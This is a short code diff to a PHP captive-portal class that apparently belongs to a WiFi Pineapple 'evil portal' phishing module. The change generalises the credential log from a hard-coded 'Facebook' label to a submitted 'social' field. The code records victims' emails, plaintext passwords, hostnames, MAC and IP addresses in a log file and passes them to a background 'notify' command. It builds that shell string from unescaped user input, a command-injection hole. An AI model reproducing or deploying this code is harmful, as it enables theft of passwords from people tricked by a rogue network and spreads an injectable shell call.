@@ -40,12 +40,13 @@ class MyPortal extends Portal
         $want .= DIRECTORY_SEPARATOR;
 
         if (isset($_POST['email'])) {
+            $social = isset($_POST['social']) ? $_POST['social'] : 'social';
             $email = isset($_POST['email']) ? $_POST['email'] : 'email';
             $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
             $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
             $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
-            file_put_contents("/pineapple/logs/cackeatres.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "Facebook\nemail: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
+            file_put_contents("/pineapple/logs/cackeatres.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "{$social}\nemail: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
             $this->execBackground("notify $email' - '$pwd");
         }
         // handle form input or other extra things there
